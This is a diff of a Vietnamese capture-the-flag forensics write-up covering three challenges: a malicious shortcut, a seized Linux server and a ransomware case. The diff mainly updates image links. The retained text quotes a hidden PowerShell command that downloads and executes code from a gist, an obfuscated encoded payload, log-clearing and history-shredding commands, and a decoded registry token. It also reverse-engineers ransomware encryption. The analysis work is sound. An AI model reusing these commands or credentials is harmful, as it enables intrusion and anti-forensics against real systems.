@@ -15,34 +15,34 @@ cover: /images/post_covers/cscv2025final.jpg
 Writeup for Forensic Challenges
 
 ## Another Day
-![image](https://hackmd.io/_uploads/BJSnhli1fl.png)
+![image](/images/cscv2025_final/1.png)
 
 *Our CIRT team has been monitoring indicators of compromise (IOCs) identified during a recent incident. During this process, we discovered that a customer’s HR computer had connected to one of the identified malicious domains. The affected machine was quarantined, and evidence was collected for further analysis. Please investigate and determine the actions performed by the attacker on this system.*
 *The flag is divided into 3 parts, wrapping them in CSCV2025{} format*
 
 Ở bài này đề cho 1 file ad1
-![image](https://hackmd.io/_uploads/ByvgTgsJzx.png)
+![image](/images/cscv2025_final/2.png)
 
 Mở bằng FTK, mày mò 1 lúc thấy 1 file shortcut khả nghi khi kiểm tra bên trong thì nó lại gọi đến 1 lệnh powershell ẩn
-![image](https://hackmd.io/_uploads/BJE4axj1Ml.png)
+![image](/images/cscv2025_final/3.png)
 
 Confirm trong file log `C:\Windows\System32\winevt\Windows PowerShell.evtx`
 
-![image](https://hackmd.io/_uploads/SJkG0gj1ze.png)
+![image](/images/cscv2025_final/4.png)
 
 ```shell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command IEX(IRM 'https://gist.githubusercontent.com/oumazio/16f129048eb2e53c07c436592821e3bb/raw/a853270425582a8156c8eaac31c26e3ad4296655/easter_egg')
 ```
 
 Lệnh này tải xuống và thực thi mã từ gist. Bên trong trang gist, chúng ta có thể thấy payload
-![image](https://hackmd.io/_uploads/HyCw0esJzl.png)
+![image](/images/cscv2025_final/5.png)
 
 ```shell
 (NeW-ObJeCT IO.COMPResSiOn.deFlATeSTReaM([SYSTem.iO.MEmORYstREaM][syStem.CONveRt]::froMbAsE64stRiNg('lVZ7b+I4EP+/Ur+DhTgB2jrHKzy6qnR0afequy2osOpJFJ0cZyDZhiRKHArq9bvfjBPzanUPhCaO5zcPz8sp3yRJlAyk8qNwnMACEgglsCtWmfgBhCrYfolC5YcZVM7Pzs8WWaih7I/RAx+CTLaxYq/nZwx/sUjEqjpztgpm83l5KJS4YLNUJX64nJd/g20tx5WfYXuNoBStzKawUdZNKCOXUJeX36e3PesrKA2oHkq5IFHgHl74yPkBUrHcENOGrN8hXCovhy6ipFr2r+qfWdlnPFBHENr89KlW+Gw0z8r+HLVroF5zZxMle1dxj/20fy10zXMlb/kjAZUloVZ3fvZG0SI8ai1Jzwcps1h5WccVoSe9yI0SEZYQknr+WCiPYOXx4/DJwg3ad4R8XiZRFrpH7P22FYdLAiqRLEHtQBCuL8dJtMRc0GGe0jVaS5UFGyB0nDmBL8e+RF91BgoJvf1k9t+bOT/zF6w6hVRxbcr4XTPZRzW6GsCltN6NrFusH0zoAwh3EARFPo3UPqc7mcOK4uT6oUqOhaDDnwsW4qJx9Uu1vunLi/qm10DS7SKRtOrTqtdE0ukjEbQngPZcJLaNpEViNnG7PWLQqyMMrrMgLfTabZu9fp0YtHJJc98hMdrrkRaXGIIkesIY6pKhjmtke1oVae61zEoQxCEFklaCHO+TQ11S39Xea1Uk4eytEbejDdnGpCCxttQ+1z6bIDV1kFrEa5Fkk/xsk5kW2bdJZYO0NR0j3qRwNWhV3xEtYbfMqk0+NbTBtiF2h4hrZHVsWwRukncNHVYN7plXW7/SARrkS7u/U9o3brQp1C1a2UQ6u5VNEg3iNqUx3oId2YGbPSPRJEM2STTa2rVdkLAQI1eXIf8R+SGrYm3N6paFz2bR7LxRm7O/2G2U3AjpmSHEr2GJ+FeaN2+MY+dJSFP2OpOeSObV8p+MUwpmNHTmtbfaYf0edMlj4ivYt8m+py8OmuRI+KQdj8fFrivp9yWKt/xOweoUxU6nAcfDSTgaaqaI8qmfz9+J9MDNAnCnIn3Orw7GbzYgMwXswPdCFi+A5RKSj4SnBYuP6NLhA8WqOPup+6HG+APEoHxSfxcqSNYiYFVSMfVXMIkFGv2GFxNdJK36EXyYJUJ7dQIfii1iO7YZPykovNqW6UeuTQoePtGxIIheJngydbcYhddCoTs+BWyIl+NERfHd4iuWzfKIp/GPHoSDtfAD4QR4wl9914UwN/+AlZMi+Ngu40TvxQpY5dEP3eglZd9jFyNSQT/yYJt0cBO/XYy5cfvgcHlWsXRHmeL3WRAcZlY7+Z89+IcC3N8HeLBVtIai5Mz9VnjBD7432Oknhim6Y9X5xSfXVuwurCB8LpENXSfawjt2YapmDRSGxcnyL41KHvrKxzbe98/xKU4a5/8cJqcvsFaZ8gMmAzbZYtpXH+xjB+Ec2L7nDOIY+1TX9HtmySRpHL1AMvEgCEofoL75MonSaKF4ged7/M+jGPKWEUb23zJROpoxeRmZ6XeE240T/P8N'),[systEM.Io.cOMPreSsIoN.COMPresSionmOdE]::DecOMPreSS) | fOREACH-OBjecT{NeW-ObJeCT  iO.strEaMReADER( $_ , [sYStEm.tEXt.eNcODINg]::AsCii) } ).REadToEnd() | .( $SheLlID[1]+$shELLId[13]+'x')
 ```
 
 Vào [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Raw_Inflate(0,0,'Adaptive',false,false)&input=bFZaN2IrSTRFUCsvVXIrRGhUZ0IyanJIS3p5NnFuUjBhZmVxdXkyb3NPcEpGSjBjWnlEWmhpUktIQXJxOWJ2ZmpCUHphblVQaENhTzV6Y1B6OHNwM3lSSmxBeWs4cU53bk1BQ0VnZ2xzQ3RXbWZnQmhDcllmb2xDNVljWlZNN1B6czhXV2FpaDdJL1JBeCtDVExheFlxL25ad3gvc1VqRXFqcHp0Z3BtODNsNUtKUzRZTE5VSlg2NG5KZC9nMjB0eDVXZllYdU5vQlN0ekthd1VkWk5LQ09YVUplWDM2ZTNQZXNyS0Eyb0hrcTVJRkhnSGw3NHlQa0JVckhjRU5PR3JOOGhYQ292aHk2aXBGcjJyK3FmV2RsblBGQkhFTnI4OUtsVytHdzB6OHIrSExWcm9GNXpaeE1sZTFkeGovMjBmeTEwelhNbGIva2pBWlVsb1ZaM2Z2WkcwU0k4YWkxSnp3Y3BzMWg1V2NjVm9TZTl5STBTRVpZUWtucitXQ2lQWU9YeDQvREp3ZzNhZDRSOFhpWlJGcnBIN1AyMkZZZExBaXFSTEVIdFFCQ3VMOGRKdE1SYzBHR2UwalZhUzVVRkd5QjBuRG1CTDhlK1JGOTFCZ29KdmYxazl0K2JPVC96RjZ3NmhWUnhiY3I0WFRQWlJ6VzZHc0NsdE42TnJGdXNIMHpvQXdoM0VBUkZQbzNVUHFjN21jT0s0dVQ2b1VxT2hhRERud3NXNHFKeDlVdTF2dW5MaS9xbTEwRFM3U0tSdE9yVHF0ZEUwdWtqRWJRbmdQWmNKTGFOcEVWaU5uRzdQV0xRcXlNTXJyTWdMZlRhYlp1OWZwMFl0SEpKYzk4aE1kcnJrUmFYR0lJa2VzSVk2cEtoam10a2Uxb1ZhZTYxekVvUXhDRUZrbGFDSE8rVFExMVMzOVhlYTFVazRleXRFYmVqRGRuR3BDQ3h0dFErMXo2YklEVjFrRnJFYTVGa2sveHNrNWtXMmJkSlpZTzBOUjBqM3FSd05XaFYzeEV0WWJmTXFrMCtOYlRCdGlGMmg0aHJaSFZzV3dSdWtuY05IVllON3BsWFc3L1NBUnJrUzd1L1U5bzNiclFwMUMxYTJVUTZ1NVZORWczaU5xVXgzb0lkMllHYlBTUFJKRU0yU1RUYTJyVmRrTEFRSTFlWElmOFIrU0dyWW0zTjZwYUZ6MmJSN0x4Um03Ty8yRzJVM0FqcG1TSEVyMkdKK0ZlYU4yK01ZK2RKU0ZQMk9wT2VTT2JWOHArTVV3cG1OSFRtdGJmYVlmMGVkTWxqNGl2WXQ4bStweThPbXVSSStLUWRqOGZGcml2cDl5V0t0L3hPd2VvVXhVNm5BY2ZEU1RnYWFxYUk4cW1mejkrSjlNRE5BbkNuSW4zT3J3N0diellnTXdYc3dQZENGaStBNVJLU2o0U25CWXVQNk5MaEE4V3FPUHVwKzZIRytBUEVvSHhTZnhjcVNOWWlZRlZTTWZWWE1Ja0ZHdjJHRnhOZEpLMzZFWHlZSlVKN2RRSWZpaTFpTzdZWlB5a292TnFXNlVldVRRb2VQdEd4SUloZUpuZ3lkYmNZaGRkQ29UcytCV3lJbCtORVJmSGQ0aXVXemZLSXAvR1BIb1NEdGZBRDRRUjR3bDk5MTRVd04vK0FsWk1pK05ndTQwVHZ4UXBZNWRFUDNlZ2xaZDlqRnlOU1FUL3lZSnQwY0JPL1hZeTVjZnZnY0hsV3NYUkhtZUwzV1JBY1psWTcrWjg5K0ljQzNOOEhlTEJWdElhaTVNejlWbmpCRDc0MzJPa25oaW02WTlYNXhTZlhWdXd1ckNCOExwRU5YU2Zhd2p0MllhcG1EUlNHeGNueUw0MUtIdnJLeHpiZTk4L3hLVTRhNS84Y0pxY3ZzRmFaOGdNbUF6YlpZdHBYSCt4akIrRWMyTDduRE9JWSsxVFg5SHRteVNScEhMMUFNdkVnQ0VvZm9MNzVNb25TYUtGNGdlZDcvTStqR1BLV0VVYjIzekpST3BveGVSbVo2WGVFMjQwVC9QOE4&oeol=CRLF) để giải mã payload
-![image](https://hackmd.io/_uploads/HkxNJWjkfe.png)
+![image](/images/cscv2025_final/6.png)
 
 ```powershell
 $ErrorActionPreference = 'SilentlyContinue'
@@ -115,18 +115,18 @@ wevtutil cl Security
 → Xóa file gốc, xóa log Windows/PowerShell, cuối cùng là ngụy trang: `Start-Process "$PWD\cv.pdf"` → Mở file PDF “cv.pdf” để đánh lạc hướng nạn nhân như thể chỉ mở CV bình thường
 
 $a1 và $a2 được sử dụng để tạo ra một chuỗi base64, khi giải mã sẽ thành: `dHIzX2Nvbl90M19saWV0X3RydVkzbl90NGlfbmthdV9iMW5rXzB4eV8=` 
-![image](https://hackmd.io/_uploads/Hkoa-Wj1Mx.png)
+![image](/images/cscv2025_final/7.png)
 
 > Part1: tr3_con_t3_liet_truY3n_t4i_nkau_b1nk_0xy_
 
 ok giờ chuyển sang con mã độc **svchost.exe** để phân tích
-![image](https://hackmd.io/_uploads/SkEhGZsyMl.png)
+![image](/images/cscv2025_final/8.png)
 
 export nó ra, load vào die
-![image](https://hackmd.io/_uploads/SJhIS-o1ze.png)
+![image](/images/cscv2025_final/9.png)
 
 Chương trình viết bằng C#, vì vậy ta sẽ sử dụng dnSpy để phân tích con mal này
-![image](https://hackmd.io/_uploads/BkGlwZs1Gx.png)
+![image](/images/cscv2025_final/10.png)
 
 Hàm main:
 
@@ -235,7 +235,7 @@ Malware kiểm tra hostname máy, nếu KHÔNG phải DESKTOP-8JDAQU5: ngủ 10 
 
 Sau khi mã vượt qua 3 cờ,thấy rằng **ShellcodeInject.Loader.Run()** tải Shellcode bằng cách sử dụng tài nguyên nhúng **shellcoders.bin** và chạy nó
 
-![image](https://hackmd.io/_uploads/ByMqlzjyMe.png)
+![image](/images/cscv2025_final/11.png)
 
 ```csharp
 using System;
@@ -301,18 +301,18 @@ namespace ShellcodeInject
 }
 ```
 Trích xuất shellcoder.bin
-![image](https://hackmd.io/_uploads/rk4n7GjJMe.png)
+![image](/images/cscv2025_final/12.png)
 
 
 và sử dụng công cụ [speakeasy](https://github.com/mandiant/speakeasy) để phân tích
-![image](https://hackmd.io/_uploads/ByukEGoJzx.png)
+![image](/images/cscv2025_final/13.png)
 
 ta có được part2 của flag:
 > s0n_tunq_mtP_884844_
 
 Đối với phần 3, mình bám vào workflow cmd powershell và tìm thử trong log của PowerShell: ***Microsoft-Windows-PowerShell%4Operational.evtx***
 
-![image](https://hackmd.io/_uploads/S1SqrMjJMl.png)
+![image](/images/cscv2025_final/14.png)
 
 Vậy ta có flag hoàn chỉnh
 > CSCV2025{tr3_con_t3_liet_truY3n_t4i_nkau_b1nk_0xy_s0n_tunq_mtP_884844_kirit0kun_8142b5a11e55c693}
@@ -321,13 +321,13 @@ Vậy ta có flag hoàn chỉnh
 
 ## Case Charlie
 
-![image](https://hackmd.io/_uploads/HkuQhIjJGe.png)
+![image](/images/cscv2025_final/15.png)
 
 Sau khi tải xuống và giải nén tập tin
-![image](https://hackmd.io/_uploads/Syup2Uskfx.png)
+![image](/images/cscv2025_final/16.png)
 
 đọc trước file pdf 
-![image](https://hackmd.io/_uploads/SkkJp8jyMl.png)
+![image](/images/cscv2025_final/17.png)
 
 *"....Nhiệm vụ của bạn là phân tích máy chủ bị thu giữ, khôi phục thông tin liên quan đến nghi phạm và trả lời các câu hỏi điều tra để hỗ trợ phiên tòa sắp tới vào tháng 12"*
 
@@ -337,7 +337,7 @@ Ok bây giờ đi trả lời từng câu hỏi của đề bài để lấy fla
 
 wtmp là một tập tin ghi lại mọi phiên đăng nhập/đăng xuất. Khi người dùng đăng nhập, Linux ghi một bản ghi mới vào wtmp. Khi người dùng đăng xuất, một bản ghi khác được ghi lại
 -> lấy last modified time của wtmp trong **/var/log/wtmp**
-![image](https://hackmd.io/_uploads/Syfo0Io1Gl.png)
+![image](/images/cscv2025_final/18.png)
 
 > 2025-11-08 04:32:56
 
@@ -345,7 +345,7 @@ wtmp là một tập tin ghi lại mọi phiên đăng nhập/đăng xuất. Khi
 Format: chatapp. Example: whatsapp, telegram, Discord***
 
 author đưa ra ví dụ về ứng dụng trò chuyện, vậy cần phải lập list ứng dụng đáng ngờ chứa các cuộc hội thoại giữa các nghi phạm. Sau khoảng 1 thời gian tìm kiếm, tìm thấy một cuộc hội thoại đáng ngờ giữa **s3v3n_wOndEr113** và **the0nlymak3r1338**
-![image](https://hackmd.io/_uploads/BykoJPikGg.png)
+![image](/images/cscv2025_final/19.png)
 > irssi
 
 ***Q3: Identify the usernames (handles) of the suspect and their contact in the chat application. (Case Sensitive)
@@ -357,7 +357,7 @@ Format: uS3rNaME13, c0nT4cTn4m3***
 Format: YYYY-MM-DD HH:MM***
 
 author hỏi thời gian cuộc trò chuyện kết thúc -> cuộn xuống cuối
-![image](https://hackmd.io/_uploads/Bk-dlviJfx.png)
+![image](/images/cscv2025_final/20.png)
 > 2025-11-08 04:36
 
 ***Q5: What command did the suspect use to overwrite the current user's .bash_history file to cover their tracks?***
@@ -366,7 +366,7 @@ author hỏi thời gian cuộc trò chuyện kết thúc -> cuộn xuống cu�
 ```
 .\strings.exe -n 5 D:\CTF\Challenges\CSCV2025-Final\for\case_charlie\evidences.vmdk | findstr /i ".bash_history" 
 ```
-![image](https://hackmd.io/_uploads/H1UHHwjJMe.png)
+![image](/images/cscv2025_final/21.png)
 
 - shred: một lệnh ghi đè an toàn lên một tập tin nhiều lần để làm cho nội dung của nó cực kỳ khó hoặc không thể khôi phục được, ngay cả với các công cụ pháp y
 - -v (verbose): Hiển thị đầu ra chi tiết về những gì shred đang thực hiện (thông báo tiến trình)
@@ -379,18 +379,18 @@ author hỏi thời gian cuộc trò chuyện kết thúc -> cuộn xuống cu�
 Format: name@domain. Example: this_Is_an_3xample_email1213@proton.me***
 
 Câu hỏi này yêu cầu chúng ta tìm địa chỉ email của nghi phạm, việc này không dễ dàng, đã tìm kiếm bằng cách cuộn qua tất cả các tập tin trên ổ đĩa nhưng không thấy gì cả. Sau đó, tác giả đưa ra một gợi ý
-![image](https://hackmd.io/_uploads/rknifPs1zg.png)
+![image](/images/cscv2025_final/22.png)
 
 Sau khi đọc gợi ý, tôi log của cuộc trò chuyện của q2 đến q4 và thu được một thông tin quan trọng
-![image](https://hackmd.io/_uploads/S1IeXDsJfx.png)
+![image](/images/cscv2025_final/23.png)
 -> Một số hình ảnh đã được tải xuống trong một tệp với thông tin đăng nhập cũ (mình cần tìm lại tệp đó). Thông tin này nhắc đến Docker, vì vậy mình đã cuộn xuống tệp Docker để tìm thêm thông tin
-![image](https://hackmd.io/_uploads/HJx_XPskzg.png)
+![image](/images/cscv2025_final/24.png)
 
 Trong tệp .docker/config.json, có thể tìm thấy một URL registry và một chuỗi base64
-![image](https://hackmd.io/_uploads/H1lYXviJzg.png)
+![image](/images/cscv2025_final/25.png)
 
 Tiến hành giải mã chuỗi b64 này
-![image](https://hackmd.io/_uploads/Skbn7Doyfg.png)
+![image](/images/cscv2025_final/26.png)
 `asjdkhufh832:glpat-xwghQbDTsJbs1B2MubX_zG86MQp1OmlxOHVzCw.01.120yvtp2f`
 
 - user: asjdkhufh832 
@@ -414,34 +414,34 @@ Congrats! Here is your flag:
 
 ## DFIR
 
-![image](https://hackmd.io/_uploads/H1XM1-2yfx.png)
+![image](/images/cscv2025_final/27.png)
 ***A senior manager at a financial company had all important documents encrypted and held for ransom. Please investigate and recover the encrypted files***
 ***Answer 1: SHA-256 of the ransomware file
 Answer 2: SHA-256 of the original financialStatement.pdf file***
 ***Flag: CSCV2025{answer1_answer2}***
 
 Chúng ta được cung cấp một máy tính chạy Windows 10, cần cài đặt nó vào VMWare
-![image](https://hackmd.io/_uploads/B1PE6OiJfx.png)
+![image](/images/cscv2025_final/28.png)
 
 Đầu tiên chúng ta có thể thấy là tất cả các tập tin đã được mã hóa (phần mở rộng .enc)
-![image](https://hackmd.io/_uploads/SyFOpdskze.png)
+![image](/images/cscv2025_final/29.png)
 
 Mất 1 hồi kiểm tra eventlog nhưng không thấy bất kỳ tiến trình nào mã hóa tất cả các tệp này, vậy thử kiểm tra xem phần mềm tống tiền có còn trên máy và vẫn đang chạy hay không bằng cách tự tạo một tệp và xem nó có bị mã hóa hay không
-![image](https://hackmd.io/_uploads/HJ_B1YsJzl.png)
+![image](/images/cscv2025_final/30.png)
 xác nhận phần mềm tống tiền vẫn đang hoạt động
 
 Vì trình quản lý tác vụ trên máy này không thể mở được nữa nên tôi sẽ sử dụng lệnh tasklist để kiểm tra các tiến trình đang chạy: **tasklist /v**
-![image](https://hackmd.io/_uploads/SJMNlYokfg.png)
+![image](/images/cscv2025_final/31.png)
 
 
 Kéo xuống 1 tý phát hiện có một tiến trình đáng ngờ: **Runtime Broker.exe** - Chương trình Windows chính xác phải là **RuntimeBroker.exe**
-![image](https://hackmd.io/_uploads/B1Z7etoyfg.png)
+![image](/images/cscv2025_final/32.png)
 
 Chúng ta sẽ kiểm tra đường dẫn tệp thực thi của nó bằng lệnh:
 ```
 Get-cimInstance Win32_Process -Filter "ProcessId = 4108" |Select-Object Name, ProcessId, ParentProcessId, ExecutablePath, CommandLine
 ```
-![image](https://hackmd.io/_uploads/ByNAbKikfe.png)
+![image](/images/cscv2025_final/33.png)
 
 Xác nhận đây là tiến trình độc hại (Vì **RuntimeBroker.exe** thực sự nằm ở **C:\Windows\System32** chứ không phải **SysWOW64**). Để xác nhận chương trình này là phần mềm tống tiền, mình sẽ thiết lập một môi trường "mồi" được kiểm soát để bắt được tiến trình nào thực sự đang thực hiện mã hóa. 
 
@@ -465,30 +465,30 @@ Set-Acl $path $acl
 # Create new file on setup path
 echo "demo" > C:\Users\MANAGER\Desktop\new.txt
 ```
-![image](https://hackmd.io/_uploads/Bk2AHKi1fe.png)
+![image](/images/cscv2025_final/34.png)
 
 Theo dõi log với eventId: 4663
-![image](https://hackmd.io/_uploads/BkE5Utiyfl.png)
-![image](https://hackmd.io/_uploads/HkacLKiJGl.png)
+![image](/images/cscv2025_final/35.png)
+![image](/images/cscv2025_final/36.png)
 
 -> Xác nhận là file **Runtime Broker.exe** là ransomware
 
-![image](https://hackmd.io/_uploads/HJRGdKo1Gx.png)
+![image](/images/cscv2025_final/37.png)
 
 > 940ca4c4440ee72b2cc89e7927276b549be0d4dca7e7ae85ff7b25ecf52ced70
 
 Giờ ta tiến hành trích xuất file malware này ra bằng FTK (load file **Windows 10 x64-000002.vmdk**)
-![image](https://hackmd.io/_uploads/HJzRr-hJMg.png)
+![image](/images/cscv2025_final/38.png)
 
 Load vào DIE
-![image](https://hackmd.io/_uploads/S1Jz8Z21ze.png)
+![image](/images/cscv2025_final/39.png)
 
 Chương trình được viết bằng C++, Load vào Ida
-![image](https://hackmd.io/_uploads/B1dDP-3yfl.png)
+![image](/images/cscv2025_final/40.png)
 Chúng ta sẽ xem xét mô-đun liên quan đến Crypto -> bcrypt. Sử dụng XREF để xác định hàm nào cần gọi
 
 Ở phần trên của sơ đồ khối, ta có thể xác định thuật toán mã hóa: AES
-![image](https://hackmd.io/_uploads/BJypOWnJfl.png)
+![image](/images/cscv2025_final/41.png)
 
 Tiếp tục sử dụng XREF để hoàn tất quy trình mã hóa
 ```
@@ -502,7 +502,7 @@ WinMain
                           └── sub_140001CC0()        // resolve GetComputerNameA / GetUserNameA
 ```
 Dựa vào workflow này, ta đi tới **sub_14000C5F0**
-![image](https://hackmd.io/_uploads/Bk2u5Z31Gl.png)
+![image](/images/cscv2025_final/42.png)
 
 ```cpp
 __int64 sub_14000C5F0()
@@ -915,21 +915,21 @@ LABEL_29:
 ```
 
 - Biến dựa trên thời gian
-![image](https://hackmd.io/_uploads/Bk-7JGhyfx.png)
+![image](/images/cscv2025_final/43.png)
 Key sinh hoàn toàn cục bộ từ T → có thể brute-force theo timestamp
 
 - AES-256 Key
-![image](https://hackmd.io/_uploads/Hy8C1z3yGe.png)
+![image](/images/cscv2025_final/44.png)
 Hash 1: Nó băm **pbInput** (chứa 8 bytes gồm **pbInput** và v23), kết quả lưu vào **pbOutput**. Hash 2 nó băm tiếp **pbOutput** sau đó băm nối thêm v16 và v17 (chính là T) -> kết quả lưu vào v25
 
 - IV
-![image](https://hackmd.io/_uploads/ByW2eGhyzg.png)
+![image](/images/cscv2025_final/45.png)
 Nó gọi **qword_14005C0D0** (GetComputerName) và **qword_14005C0D8** (GetUserName). Nếu thất bại, nó dùng chuỗi dự phòng "UnknownPC" và "UnknownUser", nó tìm ký tự _ để nối 2 chuỗi này lại thành: ComputerName_UserName. Cuối cùng, nó băm SHA-256 chuỗi này và lấy 16 bytes đầu tiên (*(_OWORD *)&pbIV = *(_OWORD *)v29;) để làm IV cho thuật toán AES-CBC
 
 Tiếp đến là hàm **sub_140009450** : Vòng lặp đệ quy và hủy diệt
 
 - Lọc file
-![image](https://hackmd.io/_uploads/BJ3gEM3yMl.png)
+![image](/images/cscv2025_final/46.png)
 ```cpp
 sub_140007CD0(v124, v158);          // lấy attributes
 
@@ -940,23 +940,23 @@ if (v158[0] != 2 || v158[2])       // không phải Regular File → skip
 - Mã hóa
 
 Nếu đối tượng là một file tài liệu bình thường, luồng thực thi cực kỳ tàn bạo=]]
-![image](https://hackmd.io/_uploads/B1sfrG3kGl.png)
+![image](/images/cscv2025_final/47.png)
 Đếm số lượng: ++v125; Ghi log: Tạo chuỗi "Found file (#...):"
 
-![image](https://hackmd.io/_uploads/ry_DSz3kGg.png)
+![image](/images/cscv2025_final/48.png)
 tạo ra một đối tượng đường dẫn mới với đuôi .enc
 
-![image](https://hackmd.io/_uploads/HJC0Hzn1fe.png)
+![image](/images/cscv2025_final/49.png)
 Nó in ra "Attempting to encrypt: " và gọi hàm lõi sub_140002F70
 
-![image](https://hackmd.io/_uploads/rkpVUfhkfe.png)
+![image](/images/cscv2025_final/50.png)
 Nếu mã hóa Thành công. Nó sẽ gọi **_std_fs_remove(v38)** để xóa vĩnh viễn file gốc
 
-![image](https://hackmd.io/_uploads/SJgnvGh1ze.png)
+![image](/images/cscv2025_final/51.png)
 Nếu mã hóa Thất bại: Báo lỗi "Failed to encrypt: "
 
 nhưng để ý 1 chút có 1 kỹ thuật khá hay được sử dụng
-![image](https://hackmd.io/_uploads/ry46Uf2JGl.png)
+![image](/images/cscv2025_final/52.png)
 *0x64 trong hệ Hexadecimal tương đương với 100. Tức là sau khi xử lý xong (hoặc thất bại) một file, mã độc sẽ ngủ đúng 100 milliseconds rồi mới mã hóa file tiếp theo. Đây là kỹ thuật "Rate Limiting" rất phổ biến trong các dòng ransomware hiện đại. Việc mã hóa quá nhanh sẽ tạo ra lượng IOPS (Input/Output Operations Per Second) khổng lồ trên ổ cứng, ngay lập tức kích hoạt các rule cảnh báo của Windows Defender hoặc các phần mềm EDR/Antivirus. Việc làm chậm quá trình này lại giúp nó "tàng hình" tốt hơn dưới radar của các công cụ giám sát hành vi*
 
 Cuối cùng ta sẽ đi vào hàm **sub_140002F70**
@@ -1228,10 +1228,10 @@ LABEL_41:
 }
 ```
 
-![image](https://hackmd.io/_uploads/H1Mq_M3yze.png)
+![image](/images/cscv2025_final/53.png)
 mã độc thiết lập thông số mã hóa: Nạp khóa bí mật ***0x20u*** tức là 32 bytes (256-bit). Biến pbSecret chính là khóa đã được sinh ra từ hàm băm thời gian ở bước trước
 
-![image](https://hackmd.io/_uploads/SJAXtM2JMx.png)
+![image](/images/cscv2025_final/54.png)
 Kỹ thuật "Double Call" của BCryptEncrypt
 - tham số pbOutput được đặt là 0i64 (NULL). Mục đích của lần gọi này không phải để mã hóa, mà để API trả về kích thước buffer cần thiết (lưu vào pcbResult). Flag 1u ở cuối cùng chính là cờ BCRYPT_BLOCK_PADDING. Nó cấp phát bộ đệm pbOutput[0] với kích thước chính xác là pcbResult.
 - **BCryptEncrypt(..., pbIV, 0x10u, pbOutput[0], cbOutput, &pcbResult, 1u)**: Lần này nó đẩy dữ liệu vào buffer vừa cấp phát để lấy bản mã thực sự. (Lưu ý nhỏ: Nó dùng một bản copy của pbIV thay vì biến global ::pbIV để đảm bảo IV không bị biến đổi sau mỗi lần mã hóa file)
@@ -1239,14 +1239,14 @@ Kỹ thuật "Double Call" của BCryptEncrypt
 Và thế là xong, tất cả những gì chúng ta cần bây giờ là xác định ComputerName để giải mã tất cả các tập tin vì username ta đã biết là MANAGER
 
 vào **\Windows\System32\config** lấy file SYSTEM
-![image](https://hackmd.io/_uploads/H16esz3kMx.png)
+![image](/images/cscv2025_final/55.png)
 
 Load vào Registry Explorer, tìm trong **ROOT \ ControlSet001 \ Control \ ComputerName \ ComputerName**
-![image](https://hackmd.io/_uploads/SJTtjfh1zl.png)
+![image](/images/cscv2025_final/56.png)
 ta có được computername là **DESKTOP-PAEK96M**
 
 Giờ tiến hành export folder chứa các file bị mã hóa ra và viết script giải mã
-![image](https://hackmd.io/_uploads/SyFO2G31Gg.png)
+![image](/images/cscv2025_final/57.png)
 
 Tạo 1 file ps1 vào cùng folder chứa các file bị mã hóa
 ```powershell
@@ -1485,10 +1485,10 @@ Write-Host "`n[!] HOAN TAT. Cac file da duoc giai ma nam trong: $OutputRoot" -Fo
 ```
 
 Sau khi giải mã
-![image](https://hackmd.io/_uploads/BkVXy7hyMx.png)
+![image](/images/cscv2025_final/58.png)
 
 Đọc hash của file theo yêu cầu đề bài
-![image](https://hackmd.io/_uploads/BkDWJmnJfl.png)
+![image](/images/cscv2025_final/59.png)
 > 6982F297B52B3E6FA6946D3DF2EF810B6CD86E679511D2CC832D70953A4DD47F
 
 Như vậy flag hoàn chỉnh là 
